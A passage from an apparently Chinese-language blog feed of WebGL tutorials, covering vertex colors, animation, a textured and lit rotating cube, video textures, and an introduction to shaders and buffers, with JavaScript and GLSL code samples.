aspect, zNear, zFar); // 将绘图位置设置为场景的中心 const modelViewMatrix = mat4.create(); // 将绘图位置稍微移动到我们要开始绘制正方形的位置 mat4.translate(modelViewMatrix, // destination matrix modelViewMatrix, // matrix to translate [-0.0, 0.0, -6.0]); // amount to translate { const numComponents = 2; // pull out 2 values per iteration const type = gl.FLOAT; // the data in the buffer is 32bit floats const normalize = false; // don't normalize const stride = 0; // how many bytes to get from one set of values to the next // 0 = use type and numComponents above const offset = 0; // how many bytes inside the buffer to start from // 绑定正方形的顶点缓冲到上下文 gl.bindBuffer(gl.ARRAY_BUFFER, buffers.position); gl.vertexAttribPointer( programInfo.attribLocations.vertexPosition, numComponents, type, normalize, stride, offset); gl.enableVertexAttribArray( programInfo.attribLocations.vertexPosition); } // 告诉 WebGL 在绘图时使用我们的程序 gl.useProgram(programInfo.program); // 设置着色器 uniforms gl.uniformMatrix4fv( programInfo.uniformLocations.projectionMatrix, false, projectionMatrix); gl.uniformMatrix4fv( programInfo.uniformLocations.modelViewMatrix, false, modelViewMatrix); { const offset = 0; const vertexCount = 4; // 画出对象 gl.drawArrays(gl.TRIANGLE_STRIP, offset, vertexCount); } } // 如何将位置缓冲区中的位置提取到 vertexPosition 属性中 function setPositionAttribute(gl, buffers, programInfo) { const numComponents = 2; // pull out 2 values per iteration const type = gl.FLOAT; // the data in the buffer is 32bit floats const normalize = false; // don't normalize const stride = 0; // how many bytes to get from one set of values to the next // 0 = use type and numComponents above const offset = 0; // how many bytes inside the buffer to start from gl.bindBuffer(gl.ARRAY_BUFFER, buffers.position); gl.vertexAttribPointer( programInfo.attribLocations.vertexPosition, numComponents, type, normalize, stride, offset ); gl.enableVertexAttribArray(programInfo.attribLocations.vertexPosition); } export { drawScene }; 在 webgl-demo.js 文件头部引入 initBuffers() 和 drawScene()： import { initBuffers } from &quot;./init-buffers.js&quot;; import { drawScene } from &quot;./draw-scene.js&quot;; 在 main() 函数结尾处添加如下代码： // 构建我们将要绘制的所有对象 const buffers = initBuffers(gl); // 绘制场景 drawScene(gl, programInfo, buffers); 现在效果如下： 添加颜色 我们已经创建好了一个正方形，接下来就是给它添加颜色，可以通过修改着色器来实现。 在 WebGL 中，物体是由一系列顶点组成的，每一个顶点都有位置和颜色信息。 在默认情况下，所有像素的颜色（以及它所有的属性，包括位置）都由线性插值计算得来，自动形成平滑的渐变。 首先我们要创建一个顶点颜色数组，然后将它们存在 WebGL 的缓冲区中。在 initBuffers() 函数中加入如下代码： function initColorBuffer(gl) { const colors = [ 1.0, 1.0, 1.0, 1.0, // 白 1.0, 0.0, 0.0, 1.0, // 红 0.0, 1.0, 0.0, 1.0, // 绿 0.0, 0.0, 1.0, 1.0, // 蓝 ]; const colorBuffer = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, colorBuffer); gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(colors), gl.STATIC_DRAW); return colorBuffer; } colors 数组中包含四组四值向量，每一组向量代表一个顶点的颜色。 然后，创建一个 WebGL 缓冲区用来存储这些颜色——将数组中的值转换成 WebGL 所规定的浮点型后存储。 在 initBuffers() 中调用这个新函数，并返回它创建的新缓冲区。用下面代码替换旧的 return 语句： const colorBuffer = initColorBuffer(gl); return { position: positionBuffer, color: colorBuffer, }; 修改顶点着色器，使得着色器可以从颜色缓冲区中正确取出颜色。在 main() 函数中更新 vsSource 的定义： const vsSource = ` attribute vec4 aVertexPosition; attribute vec4 aVertexColor; uniform mat4 uModelViewMatrix; uniform mat4 uProjectionMatrix; varying lowp vec4 vColor; void main(void) { gl_Position = uProjectionMatrix * uModelViewMatrix * aVertexPosition; vColor = aVertexColor; } `; 与之前相比，现在每个顶点都与一个颜色数组中的数值相连接。 为使每个像素都得到插值后的颜色，我们只需要在此从 vColor 变量中获取这个颜色的值。在 main() 函数中更新 fsSource 的定义： const fsSource = ` varying lowp vec4 vColor; void main(void) { gl_FragColor = vColor; } `; 这是一个非常简单的改变，每个片段只是根据其相对于顶点的位置得到一个插值过的颜色，而不是一个指定的颜色值。 接下来，我们要初始化颜色属性，以便着色器程序使用。在 main() 函数中更新 programInfo 的定义： // 收集使用着色器程序所需的所有信息 const programInfo = { program: shaderProgram, attribLocations: { vertexPosition: gl.getAttribLocation(shaderProgram, &quot;aVertexPosition&quot;), vertexColor: gl.getAttribLocation(shaderProgram, &quot;aVertexColor&quot;), }, uniformLocations: { projectionMatrix: gl.getUniformLocation(shaderProgram, &quot;uProjectionMatrix&quot;), modelViewMatrix: gl.getUniformLocation(shaderProgram, &quot;uModelViewMatrix&quot;), }, }; 修改 drawScene() 使之在绘制正方形时使用这些颜色，在 draw-scene.js 文件中添加下面函数： // 告诉 WebGL 如何将颜色缓冲区中的颜色提取到 vertexColor 属性中 function setColorAttribute(gl, buffers, programInfo) { const numComponents = 4; const type = gl.FLOAT; const normalize = false; const stride = 0; const offset = 0; gl.bindBuffer(gl.ARRAY_BUFFER, buffers.color); gl.vertexAttribPointer( programInfo.attribLocations.vertexColor, numComponents, type, normalize, stride, offset ); gl.enableVertexAttribArray(programInfo.attribLocations.vertexColor); } drawScene() 函数中在调用 gl.useProgram() 之前，先调用 setColorAttribute()： setColorAttribute(gl, buffers, programInfo); 现在效果如下： 添加动画 首先创建一个变量，用于跟踪正方形的当前旋转： let squareRotation = 0.0; 更新 drawScene() 函数以在绘制正方形时将当前旋转应用于正方形： mat4.rotate(modelViewMatrix, // destination matrix modelViewMatrix, // matrix to rotate squareRotation, // amount to rotate in radians [0, 0, 1]); // axis to rotate around 这会将 modelViewMatrix 的当前值 squareRotation 绕 Z 轴旋转。 添加 squareRotation 随时间更改值的代码。创建一个新变量来跟踪上次动画播放的时间（then），然后将以下代码添加到 main() 函数的末尾： let then = 0; // 反复绘制场景 function render(now) { now *= 0.001; // convert to seconds const deltaTime = now - then; then = now; drawScene(gl, programInfo, buffers, deltaTime); requestAnimationFrame(render); } requestAnimationFrame(render); 将以下要更新的代码 squareRotation 添加到 drawScene() 函数的末尾： squareRotation += deltaTime; 使用自上次我们更新值以来所经过的时间 squareRotation 来确定旋转正方形的距离。 现在效果如下： 创建 3D 对象 现在让我们给之前的正方形添加五个面从而可以创建一个三维的立方体。最简单的方式就是通过调用方法 gl.drawElements() 使用顶点数组列表来替换之前的通过方法 gl.drawArrays() 直接使用顶点数组。 现在会存在这样一个问题：每个面需要 4 个顶点，而每个顶点会被 3 个面共享。我们会创建一个包含 24 个顶点的数组列表，通过使用数组下标来索引顶点，然后把这些用于索引的下标传递给渲染程序而不是直接把整个顶点数据传递过去，这样来减少数据传递。那么也许你就会问：那么使用 8 个顶点就好了，为什么要使用 24 个顶点呢？这是因为每个顶点虽然被 3 个面共享但是它在每个面上需要使用不同的颜色信息。24 个顶点中的每一个都会有独立的颜色信息，这就会造成每个顶点位置都会有 3 份副本。 首先，更新 initBuffers() 函数代码，创建顶点位置数据缓存。现在的代码看起来和渲染正方形时的代码很相似，只是比之前的代码更长因为现在有了 24 个顶点（每个面使用 4 个顶点）： const vertices = [ // 前面 -1.0, -1.0, 1.0, 1.0, -1.0, 1.0, 1.0, 1.0, 1.0, -1.0, 1.0, 1.0, // 后面 -1.0, -1.0, -1.0, -1.0, 1.0, -1.0, 1.0, 1.0, -1.0, 1.0, -1.0, -1.0, // 上面 -1.0, 1.0, -1.0, -1.0, 1.0, 1.0, 1.0, 1.0, 1.0, 1.0, 1.0, -1.0, // 下面 -1.0, -1.0, -1.0, 1.0, -1.0, -1.0, 1.0, -1.0, 1.0, -1.0, -1.0, 1.0, // 右面 1.0, -1.0, -1.0, 1.0, 1.0, -1.0, 1.0, 1.0, 1.0, 1.0, -1.0, 1.0, // 左面 -1.0, -1.0, -1.0, -1.0, -1.0, 1.0, -1.0, 1.0, 1.0, -1.0, 1.0, -1.0 ]; 为每个面定义颜色，然后用一个循环语句为每个顶点定义颜色信息。 const colors = [ [1.0, 1.0, 1.0, 1.0], // Front face: white [1.0, 0.0, 0.0, 1.0], // Back face: red [0.0, 1.0, 0.0, 1.0], // Top face: green [0.0, 0.0, 1.0, 1.0], // Bottom face: blue [1.0, 1.0, 0.0, 1.0], // Right face: yellow [1.0, 0.0, 1.0, 1.0] // Left face: purple ]; const generatedColors = []; for (let j=0; j&lt;6; j++) { const c = colors[j]; for (let i=0; i&lt;4; i++) { generatedColors = generatedColors.concat(c); } } const cubeVerticesColorBuffer = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, cubeVerticesColorBuffer); gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(generatedColors), gl.STATIC_DRAW); 创建好了顶点数组，接下来就要创建元素（三角形）数组了。 const cubeVerticesIndexBuffer = gl.createBuffer(); gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, cubeVerticesIndexBuffer); // 该数组将每一个面都使用两个三角形来渲染， // 通过立方体顶点数组的索引指定每个三角形的顶点， // 这个立方体就是由 12 个三角形组成的了。 const cubeVertexIndices = [ 0, 1, 2, 0, 2, 3, // front 4, 5, 6, 4, 6, 7, // back 8, 9, 10, 8, 10, 11, // top 12, 13, 14, 12, 14, 15, // bottom 16, 17, 18, 16, 18, 19, // right 20, 21, 22, 20, 22, 23 // left ]; // 现在将元素数组发送到 GL gl.bufferData(gl.ELEMENT_ARRAY_BUFFER, new Uint16Array(cubeVertexIndices), gl.STATIC_DRAW); 接下来就需要在 drawScene() 函数里添加代码使用立方体顶点索引数据来渲染这个立方体了。 gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, cubeVerticesIndexBuffer); setMatrixUniforms(); gl.drawElements(gl.TRIANGLES, 36, gl.UNSIGNED_SHORT, 0); 立方体的每个面都由 2 个三角形组成，那就是每个面需要 6 个顶点，或者说总共 36 个顶点，尽管有许多重复的。然而，因为索引数组的每个元素都是简单的整数类型，所以每一帧动画需要传递给渲染程序的数据也不是很多。 到现在为止，我们已经创建了一个颜色生动的并且会在场景中移动和旋转的立方体。 动画纹理 可以使用类似的代码来使用任何类型的数据作为纹理的源，例如 &lt;video&gt;（或 &lt;canvas&gt;），将静态纹理替换为正在播放的 mp4 视频文件的帧即可。 首先创建将用于检索视频帧的 &lt;video&gt; 元素。将以下声明添加到 webgl-demo.js 文件的开头： // 当视频可以复制到纹理中时将被设置为 true let copyVideo = false; 将以下函数添加到 webgl-demo.js 文件中： function setupVideo(url) { const video = document.createElement(&quot;video&quot;); let playing = false; let timeupdate = false; video.playsInline = true; video.muted = true; video.loop = true; // 等待以下两个事件 // 确保 video 中已有数据 video.addEventListener( &quot;playing&quot;, () =&gt; { playing = true; checkReady(); }, true ); video.addEventListener( &quot;timeupdate&quot;, () =&gt; { timeupdate = true; checkReady(); }, true ); video.src = url; video.play(); function checkReady() { if (playing &amp;&amp; timeupdate) { copyVideo = true; } } return video; } 1. 首先，我们创建一个视频元素。我们将其设置为自动播放、静音和循环播放视频。 2. 然后，我们设置了两个事件以确保视频正在播放并且时间轴已更新。我们需要进行这两项检查，因为如果将尚无可用数据的视频上传到 WebGL，它将产生错误。检查这两个事件可确保有可用数据，并且可以安全地开始将视频上传到 WebGL 纹理。 3. 确认是否同时发生了这两个事件。如果是这样，我们将全局变量设置 copyVideo 为 true，以表示可以安全地开始将视频复制到纹理。 4. 最后，我们将 src 属性设置为 start 并调用 play 以开始加载和播放视频。 接下来的更改是初始化纹理。创建一个空的纹理对象，在其中放置一个像素，然后设置其过滤条件以供后续使用。将 webgl-demo.js 文件中的 loadTexture() 函数替换为以下代码： function initTexture(gl) { const texture = gl.createTexture(); gl.bindTexture(gl.TEXTURE_2D, texture); // 因为视频必须通过互联网下载 // 可能需要一些时间才能准备好 // 因此在纹理中放置一个像素，以便我们 // 可以立即使用它。 const level = 0; const internalFormat = gl.RGBA; const width = 1; const height = 1; const border = 0; const srcFormat = gl.RGBA; const srcType = gl.UNSIGNED_BYTE; const pixel = new Uint8Array([0, 0, 255, 255]); // 不透明的蓝色 gl.texImage2D( gl.TEXTURE_2D, level, internalFormat, width, height, border, srcFormat, srcType, pixel ); // 关闭 mips 并将包裹（wrapping）设置为边缘分割（clamp to edge） // 这样无论视频的尺寸如何，都可以正常工作。 gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE); gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE); gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR); return texture; } 将以下函数添加到 webgl-demo.js 文件中： function updateTexture(gl, texture, video) { const level = 0; const internalFormat = gl.RGBA; const srcFormat = gl.RGBA; const srcType = gl.UNSIGNED_BYTE; gl.bindTexture(gl.TEXTURE_2D, texture); gl.texImage2D( gl.TEXTURE_2D, level, internalFormat, srcFormat, srcType, video ); } 然后，我们需要在 main() 函数中调用几个新的函数。将调用 loadTexture() 的代码替换为以下内容： const texture = initTexture(gl); const video = setupVideo(&quot;Firefox.mp4&quot;); 将 render() 函数替换为以下内容： // 重复绘制场景 function render(now) { now *= 0.001; // 转换为秒 deltaTime = now - then; then = now; if (copyVideo) { updateTexture(gl, texture, video); } drawScene(gl, programInfo, buffers, texture, cubeRotation); cubeRotation += deltaTime; requestAnimationFrame(render); } 如果 copyVideo 为真，我们将会在调用 drawScene() 之前调用 updateTexture()。 在 3D 空间中模拟现实灯光 与定义更广泛的 OpenGL 不同，WebGL 并没有继承 OpenGL 中灯光的支持。所以你只能由自己完全得控制灯光，但是，这也并不是很难。 光源类型可以概括成如下三种： 环境光 是一种可以渗透到场景的每一个角落的光。它是非方向光并且会均匀地照射物体的每一个面，无论这个面是朝向哪个方向的。 方向光 是一束从一个固定的方向照射过来的光。这种光的特点可以理解为好像是从一个很遥远的地方照射过来的，然后光线中的每一个光子与其他光子都是平行运动的。举个例子来说，阳光就可以认为是方向光。 点光源光 是指光线是从一个点发射出来的，是向着四面八方发射的。这种光在我们的现实生活中是最常被用到的。举个例子来说，电灯泡就是向各个方向发射光线的。 我们会简化光照模型，只考虑简单的方向光和环境光，不会考虑任何镜面反射和点光源。这样的话，我们只需要在我们使用的环境光上加上照射到旋转立方体的方向光就可以了。虽然可以抛开点光源和镜面反射，但是关于方向光还是有几点需要注意一下： 1. 需要在每个顶点信息中加入面的朝向法线。这个法线是一个垂直于这个顶点所在平面的向量。 2. 需要明确方向光的传播方向，可以使用一个方向向量来定义。 3. 接着，我们会更新顶点着色器，考虑到环境光，再考虑到方向光（方向光的作用会因为光线方向与面的夹角关系而不同），计算每一个顶点的颜色。 首先我们需要做的第一件事是为构成我们立方体的所有顶点生成法线数组。由于立方体是一个非常简单的对象，因此很容易做到；显然，对于更复杂的对象，计算法线会更加复杂。将此函数添加到 init-buffer.js 文件中： function initNormalBuffer(gl) { const normalBuffer = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, normalBuffer); const vertexNormals = [ // Front 0.0, 0.0, 1.0, 0.0, 0.0, 1.0, 0.0, 0.0, 1.0, 0.0, 0.0, 1.0, // Back 0.0, 0.0, -1.0, 0.0, 0.0, -1.0, 0.0, 0.0, -1.0, 0.0, 0.0, -1.0, // Top 0.0, 1.0, 0.0, 0.0, 1.0, 0.0, 0.0, 1.0, 0.0, 0.0, 1.0, 0.0, // Bottom 0.0, -1.0, 0.0, 0.0, -1.0, 0.0, 0.0, -1.0, 0.0, 0.0, -1.0, 0.0, // Right 1.0, 0.0, 0.0, 1.0, 0.0, 0.0, 1.0, 0.0, 0.0, 1.0, 0.0, 0.0, // Left -1.0, 0.0, 0.0, -1.0, 0.0, 0.0, -1.0, 0.0, 0.0, -1.0, 0.0, 0.0, ]; gl.bufferData( gl.ARRAY_BUFFER, new Float32Array(vertexNormals), gl.STATIC_DRAW ); return normalBuffer; } 现在看起来应该很熟悉了；我们创建一个新缓冲区，将其绑定为我们正在使用的缓冲区，然后通过调用 bufferData() 将我们的顶点法线数组发送到缓冲区中。 在 initBuffers() 函数的末尾，添加以下代码，替换现有的 return 语句，返回它创建的缓冲区： const normalBuffer = initNormalBuffer(gl); return { position: positionBuffer, normal: normalBuffer, textureCoord: textureCoordBuffer, indices: indexBuffer, }; 然后我们将法线数组绑定到着色器属性，以便着色器代码可以访问它。将此函数添加到 draw-scene.js 文件中： // 告诉 WebGL 如何将法线从法线缓冲区中提取到 vertexNormal 属性中 function setNormalAttribute(gl, buffers, programInfo) { const numComponents = 3; const type = gl.FLOAT; const normalize = false; const stride = 0; const offset = 0; gl.bindBuffer(gl.ARRAY_BUFFER, buffers.normal); gl.vertexAttribPointer( programInfo.attribLocations.vertexNormal, numComponents, type, normalize, stride, offset ); gl.enableVertexAttribArray(programInfo.attribLocations.vertexNormal); } 将此行添加到 draw-scene.js 文件的 drawScene() 函数中，在 gl.useProgram() 行之前： setNormalAttribute(gl, buffers, programInfo); 最后，我们需要更新构建统一矩阵的代码，以生成法线矩阵并将其传递给着色器，该法线矩阵用于在处理立方体相对于光源的当前方向时转换法线。将以下代码添加到 draw-scene.js 文件的 drawScene() 函数中，在 mat4.rotate() 调用之后： const normalMatrix = mat4.create(); mat4.invert(normalMatrix, modelViewMatrix); mat4.transpose(normalMatrix, normalMatrix); 将以下代码添加到 draw-scene.js 文件的 drawScene() 函数中，在 gl.uniformMatrix4fv() 调用之后： gl.uniformMatrix4fv( programInfo.uniformLocations.normalMatrix, false, normalMatrix ); 更新着色器 现在着色器需要的所有数据都可用了，我们需要更新着色器本身的代码。 首先要做的是更新顶点着色器，让它给每一个基于环境光和方向光的顶点一个着色器值。更新 main() 函数中的 vsSource 声明： const vsSource = ` attribute vec4 aVertexPosition; attribute vec3 aVertexNormal; attribute vec2 aTextureCoord; uniform mat4 uNormalMatrix; uniform mat4 uModelViewMatrix; uniform mat4 uProjectionMatrix; varying highp vec2 vTextureCoord; varying highp vec3 vLighting; void main(void) { gl_Position = uProjectionMatrix * uModelViewMatrix * aVertexPosition; vTextureCoord = aTextureCoord; // 应用灯光效果 highp vec3 ambientLight = vec3(0.3, 0.3, 0.3); highp vec3 directionalLightColor = vec3(1, 1, 1); highp vec3 directionalVector = normalize(vec3(0.85, 0.8, 0.75)); highp vec4 transformedNormal = uNormalMatrix * vec4(aVertexNormal, 1.0); highp float directional = max(dot(transformedNormal.xyz, directionalVector), 0.0); vLighting = ambientLight + (directionalLightColor * directional); } `; 一旦计算出顶点的位置，我们就可以获得纹理对应于顶点的坐标，从而计算出顶点的阴影。 我们先根据立方体位置和朝向，通过顶点法线乘以法线矩阵来转换法线。然后，我们可以通过计算变换后的法线和方向向量（即光的来源方向）的点积来计算顶点反射方向光的量。如果这个值小于零，那么我们将值设为零，因为不能有小于零的光。 当方向光的量计算完，我们可以通过获取环境光并且添加方向光的颜色和要提供的定向光的量来生成光照值（lighting value）。最终结果我们会得到一个 RGB 值，用于片段着色器调整我们渲染的每一个像素的颜色。 现在需要根据顶点着色器计算出的光照值来更新片段着色器。更新 main() 函数中的 fsSource 声明： const fsSource = ` varying highp vec2 vTextureCoord; varying highp vec3 vLighting; uniform sampler2D uSampler; void main(void) { highp vec4 texelColor = texture2D(uSampler, vTextureCoord); gl_FragColor = vec4(texelColor.rgb * vLighting, texelColor.a); } `; 和先前我们获取纹理的颜色一样，不同的是在设置片段颜色之前，我们将纹理的颜色乘以光照值来调整纹理以达到我们光源的效果。 剩下的就只剩下查找 aVertexNormal 属性和 uNormalMatrix 全局变量的位置了。更新 main() 函数中的 programInfo 声明： const programInfo = { program: shaderProgram, attribLocations: { vertexPosition: gl.getAttribLocation(shaderProgram, &quot;aVertexPosition&quot;), vertexNormal: gl.getAttribLocation(shaderProgram, &quot;aVertexNormal&quot;), textureCoord: gl.getAttribLocation(shaderProgram, &quot;aTextureCoord&quot;), }, uniformLocations: { projectionMatrix: gl.getUniformLocation(shaderProgram, &quot;uProjectionMatrix&quot;), modelViewMatrix: gl.getUniformLocation(shaderProgram, &quot;uModelViewMatrix&quot;), normalMatrix: gl.getUniformLocation(shaderProgram, &quot;uNormalMatrix&quot;), uSampler: gl.getUniformLocation(shaderProgram, &quot;uSampler&quot;), }, }; 我们实现了基本的每个顶点的照明。对于更高级的图形，你将可能需要实现逐像素的照明。 码上掘金 ","link":"https://zkrisj.github.io/post/webgl-zhi-zuo-3d-li-ti-he-zi/"},{"title":"WebGL 介绍和基本使用","content":"介绍 WebGL（Web Graphics Library）是 Web 上 3D 图形的新标准，专为渲染 2D 图形和交互式 3D 图形而设计，允许 Internet 浏览器访问使用它们的计算机上的图形处理单元（GPU）。这种绘图技术标准允许把 JavaScript 和 OpenGL ES 2.0 结合在一起，通过增加 OpenGL ES 2.0 的一个 JavaScript 绑定，WebGL 可以为 HTML5 Canvas 提供硬件 3D 加速渲染，这样 Web 开发人员就可以借助系统显卡来在浏览器里更流畅地展示 3D 场景和模型了，还能创建复杂的导航、数据视觉化和 3D 网页游戏等。 WebGL 完美地解决了现有的 Web 交互式三维动画的两个问题：第一，它通过 HTML 脚本本身实现 Web 交互式三维动画的制作，无需任何浏览器专用渲染插件支持；第二，它利用底层的图形硬件加速功能进行的图形渲染，是通过统一的、标准的、跨平台的 OpenGL 接口实现的。 WebGL 程序包括用 JavaScript 写的控制代码，以及在图形处理单元（GPU, Graphics Processing Unit）中执行的着色代码（shader code，OpenGL Shading Language(GLSL)，类似于 C 或 C++）组成。 渲染流水线设计如下：应用程序层 -&gt; 硬件抽象层 -&gt; 硬件层。 CPU：它的优点在于调度、管理、协调能力强，计算能力则位于其次，对同一数据做许多事。 GPU：相当于一个接受 CPU 调度的 拥有大量计算能力 的员工，对大量数据做同一样事，图形处理，矩阵运算，机器学习。 发展和支持情况 WebGL 由非营利 Khronos Group 设计和维护。 WebGL 1.0（2011年3月）基于 OpenGL ES 2.0，并提供了 3D 图形的 API。它使用 HTML5 Canvas 并允许利用文档对象模型接口。WebGL 2.0（2017年1月）基于 OpenGL ES 3.0，确保了提供许多选择性的 WebGL 1.0 扩展，并引入新的 API。可利用部分 Javascript 实现垃圾回收。 目前，WebGL在最新的浏览器中被广泛支持。然而，WebGL 是否可用还是取决于硬件设备等其他因素（比如 GPU 是否支持 WebGL）。WebGL官方网站提供了一个 简单的测试页。而第三方网站提供了更详细的消息（如浏览器使用的渲染器以及可用的扩展），例如 WebGL Report、WebGL Browser Report。 游戏引擎 Babylon.js，3D 渲染引擎 three.js 封装了 WebGL，提供了各个平台之间的兼容性。使用这些框架而非原生的 WebGL 可以更容易地开发 3D 应用和游戏。 着色器 WebGL 在电脑的 GPU 中运行，因此需要使用能够在 GPU 上运行的代码。着色器是在 GPU 上运行的小程序，使用 OpenGL ES 着色语言(GLSL) 编写，可以对每个顶点和每个像素进行个性化的处理以呈现出想要的效果。WebGL 可以通过着色器解析顶点和片段信息，并对它们进行处理和渲染，实现复杂的图形效果，比如光照、阴影、反射等。另外，着色器也能够更有效地处理大量的数据，提高渲染效率。 同时，由于 WebGL 着色器是基于 OpenGL ES 2.0 的，因此开发人员可以利用 OpenGL 社区的丰富资源和工具来加快开发过程。 顶点着色器（Vertex shader） 每次渲染一个形状时，顶点着色器会在形状中的每个顶点运行。它的工作是将输入顶点从原始坐标系转换到 WebGL 使用的裁剪空间坐标系，其中每个轴的坐标范围从 -1.0 到 1.0。 根据计算出的一系列顶点位置，WebGL 可以对点、线和三角形在内的一些图元进行光栅化处理。当对这些图元进行光栅化处理时需要使用片段着色器方法。 attribute vec4 a_position; void main () { gl_Position = a_position; } 使用 attribute 存储限定符声明了一个全局 vec4 类型的全局变量。三种类型存储限定符： attribute: 只能出现在顶点着色器中，表示从外部传入 WEBGL 的顶点属性，是 WebGL 外部顶点信息传入 WebGL 内部的桥梁变量。 uniform: 可以出现在顶点着色器和片元着色器中，表示统一的值。 varying:（光栅化阶段）可以出现在顶点着色器和片元着色器中，表示变化的值，是顶点着色器和片元着色器之间的连接桥梁。 vec4 类型是 4 维向量类型，用于表示顶点的坐标信息。在 WebGL 中是采用的齐次坐标表示的坐标信息，我们用这样的形式 (x, y, z, w) 来表示一个坐标的位置，可以将它等同于这样的一个三维坐标 (x / w, y / w, z / w)。 void main 表示顶点着色器的 main 函数，类似于 C 语言的 main 函数，它是顶点着色器中的唯一入口函数。 gl_Position 是顶点着色器中的内置变量，它就表示了当前顶点的实际位置，所以我们需要将从外界接收信息的 a_position 的值赋给 gl_Position 这个变量。 片段着色器（Fragment shader） 片段着色器的作用是计算出当前绘制图元中每个像素的颜色值，使其显示在屏幕上。 片段着色器在顶点着色器处理完图形的顶点后，会被要绘制的每个图形的每个像素点调用一次。它的职责是确定像素的颜色，通过指定应用到像素的纹理元素（也就是图形纹理中的像素），获取纹理元素的颜色，然后将适当的光照应用于颜色。之后颜色存储在特殊变量 gl_FragColor 中，返回到 WebGL 层。该颜色将最终绘制到屏幕上图形对应像素的对应位置。 precision mediump float; void main () { highp vec4 color = vec4(1.0, 0.4, 0.0, 1.0); gl_FragColor = color; } 全局声明了片元着色器中浮点数类型的精度。 main 函数，与顶点着色中的含义相同。 声明了一个 vec4 类型的局部变量 color，并且指定了精度为高精度。 将 color 的值赋给 WebGL 的内置变量 gl_FragColor，gl_FragColor 表示的就是当前片元的颜色值。 使用方式 往着色器中传递顶点数据需要使用 WebGLBuffer 对象。 const colorBuffer = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, colorBuffer); gl.bufferData(gl.ARRAY_BUFFER, colorBufferData, gl.STATIC_DRAW); 数据流程图如下： ARRAY_BUFFER 是 gl 上下文对象中的一个属性，在其中起到了一个桥梁的作用。 通过 gl.bindBuffer 方法将 ARRAY_BUFFER 与我们创建的 WebGLBuffer 绑定在一起。 然后再通过 gl.bufferData 方法将真正要传入的数据传递给 ARRAY_BUFFER，最终数据流向了 WebGLBuffer。 WebGLBuffer 中已经有了数据后，还需要将着色器中的 a_position 与这个 buffer 建立联系。所以我们还需要通过下面这两个 API 建立着色器中变量与 WebGLBuffer 的联系。 gl.enableVertexAttribArray：所绑定的 WebGLBuffer 要与着色器中的哪个变量建立联系。 gl.vertexAttribPointer：如何去读取存在 WebGLBuffer 中的数据。 往着色器中传递纹理数据需要使用 WebGLTexture 对象。 在计算机图形学中是把存储在内存里的位图包裹到3D渲染物体的表面。 &lt;img&gt;、&lt;video&gt;、&lt;canvas&gt; 标签，或者是 ImageBitmap 对象，甚至是 TypedArray 都可以作为纹理。 如同图像是由像素排列而成，纹理是由纹素排列表示的，最后显示在屏幕上的像素是从纹理的纹素中计算的。 传入纹理数据的流程其实和传入顶点数据的流程差不多，如下图所示： 数据流程图如下： 同样是有一个中间的对象 TEXTURE_2D 作为桥梁来传递纹理数据，略有不同的是在创建纹理对象之后，会有一个设置纹理裁剪参数的过程。 比如一张图片的实际大小是 100 x 100 大小的，提供的纹理坐标是 (0.1, 0.2)。那么得到的颜色就是图片实际坐标第 (10, 20) 个像素的颜色。 往着色器中传递 uniform 类型的数据直接使用 WebGL 提供的 API 即可（例如 uniformMatrix4fv），而不需要额外的对象作为媒介。例如： gl.uniform1f，表示传递 1 个浮点数。 gl.uniform1fv, 表示传递一个 1 维的浮点数向量。 gl.uniform2f，表示传递 2 个浮点数。 gl.uniform2fv, 表示传递一个 2 维的浮点数向量。 gl.uniformMatrix4fv，表示向着色器中传递 4x4 矩阵类型的 uniform 变量 如何使用 WebGL WebGL 只关心两件事：裁剪空间中的坐标值和颜色值，使用 WebGL 只需要给它提供这两个东西。 需要提供两个着色器来做这两件事，一个顶点着色器提供裁剪空间坐标值，一个片段着色器提供颜色值。 WebGL 应用程序代码是 JavaScript 和 OpenGL 着色语言的组合。 JavaScript 与 CPU 进行沟通。 OpenGL 着色语言（GLSL），与 GPU 通信。 使用 JavaScript 编写以下操作的代码： 初始化 WebGL − 用于初始化 WebGL 的上下文。 创建数组 − 创建数组来保存几何数据。 缓冲区对象 − 通过将数组作为参数来创建缓冲区对象（顶点和索引）。 着色器 − 创建，编译和连接着色器。 属性 − 创建属性，启用它们并与缓冲区对象关联。 全局变量 − 创建全局变量。 变换矩阵 − 创建变换矩阵。 使用 OpenGL 着色语言（GLSL）编写着色器。 Hello GLSL 这个 WebGL 示例演示了如何通过使用顶点属性将用户输入发送到着色器来结合着色器编程和用户交互。 为了使用 WebGL，首先需要一个 canvas 元素。 &lt;canvas style=&quot;background: black;&quot;&gt;Your browser does not seem to support HTML canvas.&lt;/canvas&gt; 获取 canvas 元素和 WebGL 上下文，设置视口，清除画布颜色。 const canvas = document.querySelector(&quot;canvas&quot;); canvas.width = canvas.clientWidth; canvas.height = canvas.clientHeight; const gl = canvas.getContext(&quot;webgl&quot;) || canvas.getContext(&quot;experimental-webgl&quot;); if (!gl) { const paragraph = document.querySelector(&quot;p&quot;); paragraph.textContent = &quot;Failed. Your browser or device may not support WebGL.&quot;; return null; } gl.viewport(0, 0, gl.drawingBufferWidth, gl.drawingBufferHeight); gl.clearColor(0.0, 0.0, 0.0, 1.0); gl.clear(gl.COLOR_BUFFER_BIT); 编写顶点着色器和片段着色器程序，编译它们，链接这两个着色器到程序。 &lt;script type=&quot;x-shader/x-vertex&quot; id=&quot;vertex-shader&quot;&gt; #version 100 precision highp float; attribute float position; void main() { gl_Position = vec4(position, 0.0, 0.0, 1.0); gl_PointSize = 64.0; } &lt;/script&gt; &lt;script type=&quot;x-shader/x-fragment&quot; id=&quot;fragment-shader&quot;&gt; #version 100 precision mediump float; void main() { gl_FragColor = vec4(0.18, 0.54, 0.34, 1.0); } &lt;/script&gt; let source = document.querySelector(&quot;#vertex-shader&quot;).innerHTML; const vertexShader = gl.createShader(gl.VERTEX_SHADER); gl.shaderSource(vertexShader, source); gl.compileShader(vertexShader); source = document.querySelector(&quot;#fragment-shader&quot;).innerHTML; const 